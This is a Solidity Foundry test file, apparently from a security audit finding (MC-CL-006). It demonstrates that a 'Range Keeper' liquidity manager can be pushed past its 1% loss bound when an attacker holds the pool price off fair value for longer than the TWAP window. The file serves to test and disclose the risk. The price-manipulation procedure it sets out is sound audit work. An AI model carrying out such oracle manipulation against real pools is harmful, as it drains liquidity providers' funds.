// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {RangeKeeperBase} from "../RangeKeeper.t.sol";
import {RangeKeeper} from "../../../src/charters/range/RangeKeeper.sol";
import {PoolMath} from "../../../src/charters/lib/PoolMath.sol";
import {TickMathLite} from "../../../src/charters/lib/TickMathLite.sol";

/// MC-CL-006 (design risk, quantified): Range Keeper measures its per-move loss bound at the pool's own TWAP. If the
/// pool price is held away from fair value for the TWAP window, the keeper re-centres and swaps at the manipulated
/// price, the bound passes (it is measured at the same manipulated price), and the loss at the fair price exceeds
/// maxLossBps. This fixture has no arbitrageurs, so it isolates the mechanism; it does not price the cost of holding
/// a deep mainnet pool off-market for the window, which is what protects the reviewed pools.
contract BlindRangeManipulationPoC is RangeKeeperBase {
    address attacker = makeAddr("attacker");

    function startTick() internal pure override returns (int24) {
        return 63970;
    }

    uint256 w0;
    uint256 w1;

    /// Position value plus whatever reached the owner's wallet since the grant, valued at sqrt price p.
    function _ownerValueAt(RangeKeeper k, uint160 p) internal view returns (uint256 v) {
        (,,,,, int24 lo, int24 up, uint128 liq,,,,) = npm.positions(k.tokenId());
        (uint256 x, uint256 y) = PoolMath.amountsForLiquidity(p, TickMathLite.getSqrtRatioAtTick(lo), TickMathLite.getSqrtRatioAtTick(up), liq);
        v = PoolMath.valueIn1(p, x + t0.balanceOf(owner) - w0, y + t1.balanceOf(owner) - w1);
    }

    function test_PoC_sustainedTwapManipulation_lossAtFairPriceExceedsBound() public {
        RangeKeeper k = _create(0, true, 100, 3); // 1% per-move bound
        int24 fairTick = _tick(pool);
        uint160 fair = TickMathLite.getSqrtRatioAtTick(fairTick);
        w0 = t0.balanceOf(owner);
        w1 = t1.balanceOf(owner);
        uint256 v0 = _ownerValueAt(k, fair);

        // The attacker pushes the price 1,500 ticks below the range and holds it for longer than the 600 s window.
        _moveAndSettle(pool, lower - 1_500, 700);
        vm.prank(keel);
        k.act();
        // The attacker lets the price return to fair value.
        _moveAndSettle(pool, fairTick, 700);

        uint256 v1 = _ownerValueAt(k, fair);
        uint256 lossBps = (v0 - v1) * 10_000 / v0;
        emit log_named_uint("owner loss at fair price (bps)", lossBps);
        assertGt(lossBps, 100, "loss at fair value exceeds the 1% per-move bound");
    }
}
